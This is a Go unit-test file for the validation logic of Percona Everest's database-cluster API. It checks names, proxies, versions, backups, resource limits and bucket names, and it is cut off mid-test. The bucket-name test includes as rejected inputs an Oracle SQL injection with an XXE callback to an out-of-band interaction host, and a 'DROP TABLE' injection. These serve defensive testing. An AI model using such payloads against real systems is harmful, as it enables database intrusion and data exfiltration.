// everest
// Copyright (C) 2023 Percona LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
package api

import (
	"context"
	"encoding/json"
	"errors"
	"testing"

	"github.com/AlekSi/pointer"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	everestv1alpha1 "github.com/percona/everest-operator/api/v1alpha1"
	"github.com/percona/everest/pkg/kubernetes"
	"github.com/percona/everest/pkg/kubernetes/client"
	"github.com/percona/everest/pkg/rbac"
	"github.com/percona/everest/pkg/rbac/mocks"
)

func TestValidateRFC1035(t *testing.T) {
	t.Parallel()
	type testCase struct {
		value string
		valid bool
	}

	cases := []testCase{
		{
			value: "abc-sdf12",
			valid: true,
		},
		{
			value: "-abc-sdf12",
			valid: false,
		},
		{
			value: "abc-sdf12-",
			valid: false,
		},
		{
			value: "abc-sAAf12",
			valid: false,
		},
		{
			value: "abc-sAAf12",
			valid: false,
		},
		{
			value: "1abc-sf12",
			valid: false,
		},
		{
			value: "aaa123",
			valid: true,
		},
		{
			value: "asldkafaslkdjfalskdfjaslkdjflsakfjdalskfdjaslkfdjaslkfdjsaklfdassksjdfhskdjfskjdfsdfsdflasdkfasdfk",
			valid: false,
		},
		{
			value: "$%",
			valid: false,
		},
		{
			value: "asdf32$%",
			valid: false,
		},
		{
			value: "",
			valid: false,
		},
	}

	for _, tc := range cases {
		t.Run(tc.value, func(t *testing.T) {
			t.Parallel()
			require.Equal(t, tc.valid, validateRFC1035(tc.value, "") == nil)
		})
	}
}

func TestValidateCreateDatabaseClusterRequest(t *testing.T) {
	t.Parallel()
	type testCase struct {
		name  string
		value DatabaseCluster
		err   error
	}

	cases := []testCase{
		{
			name:  "empty metadata",
			value: DatabaseCluster{},
			err:   errDBCEmptyMetadata,
		},
		{
			name:  "no dbCluster name",
			value: DatabaseCluster{Metadata: &map[string]interface{}{}},
			err:   errDBCNameEmpty,
		},
		{
			name: "empty dbCluster name",
			value: DatabaseCluster{Metadata: &map[string]interface{}{
				"name":      "",
				"namespace": "ns",
			}},
			err: ErrNameNotRFC1035Compatible("metadata.name"),
		},
		{
			name: "starts with -",
			value: DatabaseCluster{Metadata: &map[string]interface{}{
				"name":      "-sdfasa",
				"namespace": "ns",
			}},
			err: ErrNameNotRFC1035Compatible("metadata.name"),
		},
		{
			name: "ends with -",
			value: DatabaseCluster{Metadata: &map[string]interface{}{
				"name":      "sdfasa-",
				"namespace": "ns",
			}},
			err: ErrNameNotRFC1035Compatible("metadata.name"),
		},
		{
			name: "contains uppercase",
			value: DatabaseCluster{Metadata: &map[string]interface{}{
				"name":      "AAsdf",
				"namespace": "ns",
			}},
			err: ErrNameNotRFC1035Compatible("metadata.name"),
		},
		{
			name: "valid",
			value: DatabaseCluster{Metadata: &map[string]interface{}{
				"name":      "amsdf-sllla",
				"namespace": "ns",
			}},
			err: nil,
		},
		{
			name: "dbCluster name wrong format",
			value: DatabaseCluster{Metadata: &map[string]interface{}{
				"name": make(map[string]string),
			}},
			err: errDBCNameWrongFormat,
		},
		{
			name: "dbCluster name too long",
			value: DatabaseCluster{Metadata: &map[string]interface{}{
				"name":      "a123456789a123456789a12",
				"namespace": "ns",
			}},
			err: ErrNameTooLong("metadata.name"),
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			err := validateCreateDatabaseClusterRequest(c.value)
			if c.err == nil {
				require.NoError(t, err)
				return
			}
			assert.Equal(t, c.err.Error(), err.Error())
		})
	}
}

func TestValidateProxyType(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name       string
		engineType string
		proxyType  string
		err        error
	}{
		{
			name:       "PXC with mongos",
			engineType: "pxc",
			proxyType:  "mongos",
			err:        errUnsupportedPXCProxy,
		},
		{
			name:       "PXC with pgbouncer",
			engineType: "pxc",
			proxyType:  "pgbouncer",
			err:        errUnsupportedPXCProxy,
		},
		{
			name:       "PXC with haproxy",
			engineType: "pxc",
			proxyType:  "haproxy",
			err:        nil,
		},
		{
			name:       "PXC with proxysql",
			engineType: "pxc",
			proxyType:  "proxysql",
			err:        nil,
		},
		{
			name:       "psmdb with mongos",
			engineType: "psmdb",
			proxyType:  "mongos",
			err:        nil,
		},
		{
			name:       "psmdb with pgbouncer",
			engineType: "psmdb",
			proxyType:  "pgbouncer",
			err:        errUnsupportedPSMDBProxy,
		},
		{
			name:       "psmdb with haproxy",
			engineType: "psmdb",
			proxyType:  "haproxy",
			err:        errUnsupportedPSMDBProxy,
		},
		{
			name:       "psmdb with proxysql",
			engineType: "psmdb",
			proxyType:  "proxysql",
			err:        errUnsupportedPSMDBProxy,
		},
		{
			name:       "postgresql with mongos",
			engineType: "postgresql",
			proxyType:  "mongos",
			err:        errUnsupportedPGProxy,
		},
		{
			name:       "postgresql with pgbouncer",
			engineType: "postgresql",
			proxyType:  "pgbouncer",
			err:        nil,
		},
		{
			name:       "postgresql with haproxy",
			engineType: "postgresql",
			proxyType:  "haproxy",
			err:        errUnsupportedPGProxy,
		},
		{
			name:       "postgresql with proxysql",
			engineType: "postgresql",
			proxyType:  "proxysql",
			err:        errUnsupportedPGProxy,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			err := validateProxyType(DatabaseClusterSpecEngineType(c.engineType), c.proxyType)
			if c.err == nil {
				require.NoError(t, err)
				return
			}
			assert.Equal(t, c.err.Error(), err.Error())
		})
	}
}

func TestValidateProxy(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cluster []byte
		err     error
	}{
		{
			name:    "ok: 3 nodes 2 proxies",
			cluster: []byte(`{"spec": {"engine": {"type": "pxc", "replicas": 3}, "proxy": {"type": "haproxy", "replicas": 2}}}`),
			err:     nil,
		},
		{
			name:    "errMinProxyReplicas",
			cluster: []byte(`{"spec": {"engine": {"type": "pxc", "replicas": 3}, "proxy": {"type": "haproxy", "replicas": 1}}}`),
			err:     errMinPXCProxyReplicas,
		},
		{
			name:    "ok: 1 node 1 proxy",
			cluster: []byte(`{"spec": {"engine": {"type": "pxc", "replicas": 1}, "proxy": {"type": "haproxy", "replicas": 1}}}`),
			err:     nil,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			cluster := &DatabaseCluster{}
			err := json.Unmarshal(c.cluster, cluster)
			require.NoError(t, err)
			err = validateProxy(cluster)
			if c.err == nil {
				require.NoError(t, err)
				return
			}
			assert.Equal(t, err.Error(), c.err.Error())
		})
	}
}

func TestContainsVersion(t *testing.T) {
	t.Parallel()
	cases := []struct {
		version  string
		versions []string
		result   bool
	}{
		{
			version:  "1",
			versions: []string{},
			result:   false,
		},
		{
			version:  "1",
			versions: []string{"1", "2"},
			result:   true,
		},
		{
			version:  "1",
			versions: []string{"1"},
			result:   true,
		},
		{
			version:  "1",
			versions: []string{"12", "23"},
			result:   false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.version, func(t *testing.T) {
			t.Parallel()
			res := containsVersion(tc.version, tc.versions)
			assert.Equal(t, res, tc.result)
		})
	}
}

func TestValidateVersion(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		version *string
		engine  *everestv1alpha1.DatabaseEngine
		err     error
	}{
		{
			name:    "empty version is allowed",
			version: nil,
			engine:  nil,
			err:     nil,
		},
		{
			name:    "shall exist in availableVersions",
			version: pointer.ToString("8.0.32"),
			engine: &everestv1alpha1.DatabaseEngine{
				Status: everestv1alpha1.DatabaseEngineStatus{
					AvailableVersions: everestv1alpha1.Versions{
						Engine: everestv1alpha1.ComponentsMap{
							"8.0.32": &everestv1alpha1.Component{},
						},
					},
				},
			},
			err: nil,
		},
		{
			name:    "shall not exist in availableVersions",
			version: pointer.ToString("8.0.32"),
			engine: &everestv1alpha1.DatabaseEngine{
				Status: everestv1alpha1.DatabaseEngineStatus{
					AvailableVersions: everestv1alpha1.Versions{
						Engine: everestv1alpha1.ComponentsMap{
							"8.0.31": &everestv1alpha1.Component{},
						},
					},
				},
			},
			err: errors.New("8.0.32 is not in available versions list"),
		},
		{
			name:    "shall exist in allowedVersions",
			version: pointer.ToString("8.0.32"),
			engine: &everestv1alpha1.DatabaseEngine{
				Spec: everestv1alpha1.DatabaseEngineSpec{
					Type:            "pxc",
					AllowedVersions: []string{"8.0.32"},
				},
			},
			err: nil,
		},
		{
			name:    "shall not exist in allowedVersions",
			version: pointer.ToString("8.0.32"),
			engine: &everestv1alpha1.DatabaseEngine{
				Spec: everestv1alpha1.DatabaseEngineSpec{
					Type:            "pxc",
					AllowedVersions: []string{"8.0.31"},
				},
			},
			err: errors.New("using 8.0.32 version for pxc is not allowed"),
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := validateVersion(tc.version, tc.engine)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			assert.Equal(t, err.Error(), tc.err.Error())
		})
	}
}

func TestValidateBackupSpec(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cluster []byte
		err     error
	}{
		{
			name:    "empty backup is allowed",
			cluster: []byte(`{"spec": {"backup": null}}`),
			err:     nil,
		},
		{
			name:    "disabled backup is allowed",
			cluster: []byte(`{"spec": {"backup": {"enabled": false}}}`),
			err:     nil,
		},
		{
			name:    "errNoSchedules",
			cluster: []byte(`{"spec": {"backup": {"enabled": true}}}`),
			err:     errNoSchedules,
		},
		{
			name:    "errNoNameInSchedule",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "schedules": [{"enabled": true}]}}}`),
			err:     errNoNameInSchedule,
		},
		{
			name:    "errNoBackupStorageName",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "schedules": [{"enabled": true, "name": "name"}]}}}`),
			err:     errScheduleNoBackupStorageName,
		},
		{
			name:    "errDuplicatedSchedules",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "schedules": [{"schedule": "0 0 * * *", "name": "name"}, {"schedule": "0 0 * * *", "name": "otherName"}]}}}`),
			err:     errDuplicatedSchedules,
		},
		{
			name:    "valid spec",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "schedules": [{"enabled": true, "name": "name", "backupStorageName": "some"}]}}}`),
			err:     nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			cluster := &DatabaseCluster{}
			err := json.Unmarshal(tc.cluster, cluster)
			require.NoError(t, err)
			err = validateBackupSpec(cluster)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			assert.Equal(t, err.Error(), tc.err.Error())
		})
	}
}

func TestValidateBackupStoragesFor(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name      string
		namespace string
		cluster   []byte
		storage   []byte
		err       error
	}{
		{
			name:      "errPSMDBMultipleStorages",
			namespace: "everest",
			cluster:   []byte(`{"spec": {"backup": {"enabled": true, "schedules": [{"enabled": true, "name": "name", "backupStorageName": "storage1"}, {"enabled": true, "name": "name2", "backupStorageName": "storage2"}]}, "engine": {"type": "psmdb"}}}`),
			storage:   []byte(`{"spec": {"type": "s3"}}`),
			err:       errPSMDBMultipleStorages,
		},
		{
			name:      "errPSMDBViolateActiveStorage",
			namespace: "everest",
			cluster:   []byte(`{"status": {"activeStorage": "storage1"}, "spec": {"backup": {"enabled": true, "schedules": [{"enabled": true, "name": "otherName", "backupStorageName": "storage2"}]}, "engine": {"type": "psmdb"}}}`),
			storage:   []byte(`{"spec": {"type": "s3"}}`),
			err:       errPSMDBViolateActiveStorage,
		},
		{
			name:      "no errPSMDBViolateActiveStorage",
			namespace: "everest",
			cluster:   []byte(`{"status": {"activeStorage": ""}, "spec": {"backup": {"enabled": true, "schedules": [{"enabled": true, "name": "otherName", "backupStorageName": "storage2"}]}, "engine": {"type": "psmdb"}}}`),
			storage:   []byte(`{"spec": {"type": "s3"}}`),
			err:       nil,
		},
		{
			name:      "errPXCPitrS3Only",
			namespace: "everest",
			cluster:   []byte(`{"status":{},"spec": {"backup": {"enabled": true, "pitr": {"enabled": true, "backupStorageName": "storage"}, "schedules": [{"enabled": true, "name": "otherName", "backupStorageName": "storage"}]}, "engine": {"type": "pxc"}}}`),
			storage:   []byte(`{"spec": {"type": "azure"}}`),
			err:       errPXCPitrS3Only,
		},
		{
			name:      "errPitrNoBackupStorageName",
			namespace: "everest",
			cluster:   []byte(`{"status":{},"spec": {"backup": {"enabled": true, "pitr": {"enabled": true}, "schedules": [{"enabled": true, "name": "otherName", "backupStorageName": "storage"}]}, "engine": {"type": "pxc"}}}`),
			storage:   []byte(`{"spec": {"type": "s3"}}`),
			err:       errPitrNoBackupStorageName,
		},
		{
			name:      "valid",
			namespace: "everest",
			cluster:   []byte(`{"status":{},"spec": {"backup": {"enabled": true, "pitr": {"enabled": true, "backupStorageName": "storage2"}, "schedules": [{"enabled": true, "name": "otherName", "backupStorageName": "storage"}]}, "engine": {"type": "pxc"}}}`),
			storage:   []byte(`{"spec": {"type": "s3"}}`),
			err:       nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			cluster := &DatabaseCluster{}
			err := json.Unmarshal(tc.cluster, cluster)
			require.NoError(t, err)

			storage := &everestv1alpha1.BackupStorage{}
			err = json.Unmarshal(tc.storage, storage)
			require.NoError(t, err)

			k := &kubernetes.Kubernetes{}
			mockConnector := &client.MockKubeClientConnector{}
			mockConnector.On("GetBackupStorage", mock.Anything, mock.Anything, mock.Anything).
				Return(storage, nil)
			k.WithClient(mockConnector)
			e := EverestServer{
				kubeClient: k,
			}

			err = e.validateBackupStoragesFor(
				context.Background(),
				tc.namespace,
				cluster,
			)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Equal(t, err.Error(), tc.err.Error())
		})
	}
}

func TestValidatePitrSpec(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name    string
		cluster []byte
		err     error
	}{
		{
			name:    "valid spec pitr enabled",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "pitr": {"enabled": true, "backupStorageName": "name"}}}}`),
			err:     nil,
		},
		{
			name:    "valid spec pitr disabled",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "pitr": {"enabled": false}}}}`),
			err:     nil,
		},
		{
			name:    "valid spec no pitr",
			cluster: []byte(`{"spec": {"backup": {"enabled": true}}}`),
			err:     nil,
		},
		{
			name:    "no backup storage pxc",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "pitr": {"enabled": true}}, "engine": {"type": "pxc"}}}`),
			err:     errPitrNoBackupStorageName,
		},
		{
			name:    "no backup storage psmdb",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "pitr": {"enabled": true}}, "engine": {"type": "psmdb"}}}`),
			err:     nil,
		},
		{
			name:    "no backup storage pg",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "pitr": {"enabled": true}}, "engine": {"type": "postgresql"}}}`),
			err:     nil,
		},
		{
			name:    "zero upload interval",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "pitr": {"enabled": true, "backupStorageName": "name", "uploadIntervalSec": 0}}}}`),
			err:     errPitrUploadInterval,
		},
		{
			name:    "negative upload interval",
			cluster: []byte(`{"spec": {"backup": {"enabled": true, "pitr": {"enabled": true, "backupStorageName": "name", "uploadIntervalSec": -100}}}}`),
			err:     errPitrUploadInterval,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			cluster := &DatabaseCluster{}
			err := json.Unmarshal(tc.cluster, cluster)
			require.NoError(t, err)
			err = validatePitrSpec(cluster)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Equal(t, err.Error(), tc.err.Error())
		})
	}
}

func TestValidateResourceLimits(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cluster []byte
		err     error
	}{
		{
			name:    "success",
			cluster: []byte(`{"spec": {"engine": {"resources": {"cpu": "600m", "memory":"1G"}, "storage": {"size": "2G"}}}}`),
			err:     nil,
		},
		{
			name:    "errNoResourceDefined",
			cluster: []byte(`{"spec": {"engine": {"resources":null, "storage": {"size": "2G"}}}}`),
			err:     errNoResourceDefined,
		},
		{
			name:    "Not enough CPU",
			cluster: []byte(`{"spec": {"engine": {"resources": {"cpu": null, "memory":"1G"}, "storage": {"size": "2G"}}}}`),
			err:     errNotEnoughCPU,
		},
		{
			name:    "Not enough memory",
			cluster: []byte(`{"spec": {"engine": {"resources": {"cpu": "600m", "memory":null}, "storage": {"size": "2G"}}}}`),
			err:     errNotEnoughMemory,
		},
		{
			name:    "No int64 for CPU",
			cluster: []byte(`{"spec": {"engine": {"resources": {"cpu": 6000, "memory": "1G"}, "storage": {"size": "2G"}}}}`),
			err:     errInt64NotSupported,
		},
		{
			name:    "No int64 for Memory",
			cluster: []byte(`{"spec": {"engine": {"resources": {"cpu": "600m", "memory": 1000000}, "storage": {"size": "2G"}}}}`),
			err:     errInt64NotSupported,
		},
		{
			name:    "No int64 for storage",
			cluster: []byte(`{"spec": {"engine": {"resources": {"cpu": "600m", "memory": "1G"}, "storage": {"size": 20000}}}}`),
			err:     errInt64NotSupported,
		},
		{
			name:    "not enough disk size",
			cluster: []byte(`{"spec": {"engine": {"resources": {"cpu": "600m", "memory": "1G"}, "storage": {"size": "512M"}}}}`),
			err:     errNotEnoughDiskSize,
		},
		{
			name:    "not enough CPU",
			cluster: []byte(`{"spec": {"engine": {"resources": {"cpu": "200m", "memory": "1G"}, "storage": {"size": "2G"}}}}`),
			err:     errNotEnoughCPU,
		},
		{
			name:    "not enough Mem",
			cluster: []byte(`{"spec": {"engine": {"resources": {"cpu": "600m", "memory": "400M"}, "storage": {"size": "2G"}}}}`),
			err:     errNotEnoughMemory,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			cluster := &DatabaseCluster{}
			err := json.Unmarshal(tc.cluster, cluster)
			require.NoError(t, err)
			err = validateResourceLimits(cluster)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Equal(t, err.Error(), tc.err.Error())
		})
	}
}

func TestValidateDataSource(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cluster []byte
		err     error
	}{
		{
			name:    "err none of the data source specified",
			cluster: []byte(`{}`),
			err:     errDataSourceConfig,
		},
		{
			name:    "err both of the data source specified",
			cluster: []byte(`{"dbClusterBackupName":"some-backup", "backupSource": {"backupStorageName":"some-name","path":"some-path"}}`),
			err:     errDataSourceConfig,
		},
		{
			name:    "err no date in pitr",
			cluster: []byte(`{"dbClusterBackupName":"some-backup","pitr":{}}`),
			err:     errDataSourceNoPitrDateSpecified,
		},
		{
			name:    "wrong pitr date format",
			cluster: []byte(`{"dbClusterBackupName":"some-backup","pitr":{"date":"2006-06-07 14:06:07"}}`),
			err:     errDataSourceWrongDateFormat,
		},
		{
			name:    "wrong pitr date format",
			cluster: []byte(`{"dbClusterBackupName":"some-backup","pitr":{"date":""}}`),
			err:     errDataSourceWrongDateFormat,
		},
		{
			name:    "correct minimal",
			cluster: []byte(`{"dbClusterBackupName":"some-backup","pitr":{"date":"2006-06-07T14:06:07Z"}}`),
			err:     nil,
		},
		{
			name:    "correct with pitr type",
			cluster: []byte(`{"dbClusterBackupName":"some-backup","pitr":{"type":"date","date":"2006-06-07T14:06:07Z"}}`),
			err:     nil,
		},
		{
			name:    "unsupported pitr type",
			cluster: []byte(`{"backupSource":{"backupStorageName":"some-name","path":"some-path"},"pitr":{"type":"latest"}}`),
			err:     errUnsupportedPitrType,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			dsDB := &dataSourceStruct{}
			err := json.Unmarshal(tc.cluster, dsDB)
			require.NoError(t, err)
			err = validateDataSource(*dsDB)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Equal(t, err.Error(), tc.err.Error())
		})
	}
}

func TestValidatePGReposForAPIDB(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name           string
		cluster        []byte
		getBackupsFunc func(ctx context.Context, ns string, options metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error)
		err            error
	}{
		{
			name:    "ok: no schedules no backups",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{},
				}, nil
			},
			err: nil,
		},
		{
			name:    "ok: 2 schedules 2 backups with the same storages",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"},"spec":{"backup":{"schedules":[{"backupStorageName":"bs1"},{"backupStorageName":"bs2"}]}}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
					},
				}, nil
			},
			err: nil,
		},
		{
			name:    "error: 3 schedules in different bs and 1 backup in another bs",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"},"spec":{"backup":{"schedules":[{"backupStorageName":"bs1"},{"backupStorageName":"bs2"},{"backupStorageName":"bs3"}]}}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs4"}},
					},
				}, nil
			},
			err: errTooManyPGStorages,
		},
		{
			name:    "ok: 3 schedules",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"},"spec":{"backup":{"schedules":[{"backupStorageName":"bs1"},{"backupStorageName":"bs2"},{"backupStorageName":"bs3"}]}}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{},
				}, nil
			},
			err: nil,
		},
		{
			name:    "ok: 3 backups with different storages",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs3"}},
					},
				}, nil
			},
			err: nil,
		},
		{
			name:    "ok: 5 backups with repeating storages",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs3"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
					},
				}, nil
			},
			err: nil,
		},
		{
			name:    "error: 4 backups with different storages",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs3"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs4"}},
					},
				}, nil
			},
			err: errTooManyPGStorages,
		},
		{
			name:    "ok: 4 backups with same storages",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
					},
				}, nil
			},
			err: nil,
		},
		{
			name:    "error: 4 schedules",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"},"spec":{"backup":{"schedules":[{"backupStorageName":"bs1"},{"backupStorageName":"bs2"},{"backupStorageName":"bs3"},{"backupStorageName":"bs4"}]}}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{},
				}, nil
			},
			err: errTooManyPGStorages,
		},
		{
			name:    "error: 2 schedules 2 backups with different storages",
			cluster: []byte(`{"metaData":{"name":"some","namespace":"ns"},"spec":{"backup":{"schedules":[{"backupStorageName":"bs1"},{"backupStorageName":"bs2"}]}}}`),
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs3"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs4"}},
					},
				}, nil
			},
			err: errTooManyPGStorages,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			db := &DatabaseCluster{}
			err := json.Unmarshal(tc.cluster, db)
			require.NoError(t, err)
			err = validatePGReposForAPIDB(context.Background(), db, tc.getBackupsFunc)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Equal(t, tc.err.Error(), err.Error())
		})
	}
}

func TestValidateMetadata(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name     string
		metadata *map[string]interface{}
		err      error
	}{
		{
			name:     "empty metadata",
			metadata: nil,
			err:      errNoMetadata,
		},
		{
			name:     "too big resourceVersion",
			metadata: &map[string]interface{}{"resourceVersion": "99999999999999999999"},
			err:      errInvalidResourceVersion,
		},
		{
			name:     "invalid characters in resourceVersion",
			metadata: &map[string]interface{}{"resourceVersion": "34s3s@#$s"},
			err:      errInvalidResourceVersion,
		},
		{
			name:     "valid resourceVersion",
			metadata: &map[string]interface{}{"resourceVersion": "2342352242"},
			err:      nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := validateMetadata(tc.metadata)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Equal(t, err.Error(), tc.err.Error())
		})
	}
}

func TestValidateBucketName(t *testing.T) {
	t.Parallel()

	type tcase struct {
		name  string
		input string
		err   error
	}

	tcases := []tcase{
		{
			name:  "empty string",
			input: "",
			err:   errInvalidBucketName,
		},
		{
			name:  "too long",
			input: `(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % uicfw SYSTEM \"http:\/\/t93xxgfug88povc63wzbdbsd349zxulx9pwfk4.oasti'||'fy.com\/\">%uicfw;]>'),'\/l') from dual)`,
			err:   errInvalidBucketName,
		},
		{
			name:  "unexpected symbol",
			input: `; DROP TABLE users`,
			err:   errInvalidBucketName,
		},
		{
			name:  "correct",
			input: "aaa-12-d.e",
			err:   nil,
		},
	}

	for _, tc := range tcases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := validateBucketName(tc.input)
			assert.ErrorIs(t, err, tc.err)
		})
	}
}

func TestValidateDBEngineUpgrade(t *testing.T) {
	t.Parallel()
	testCases := []struct {
		name       string
		oldVersion string
		newVersion string
		err        error
	}{
		{
			name:       "invalid version",
			oldVersion: "1.0.0",
			newVersion: "1!00;",
			err:        errInvalidVersion,
		},
		{
			name:       "major upgrade",
			oldVersion: "8.0.22",
			newVersion: "9.0.0",
			err:        errDBEngineMajorVersionUpgrade,
		},
		{
			name:       "downgrade",
			oldVersion: "8.0.22",
			newVersion: "8.0.21",
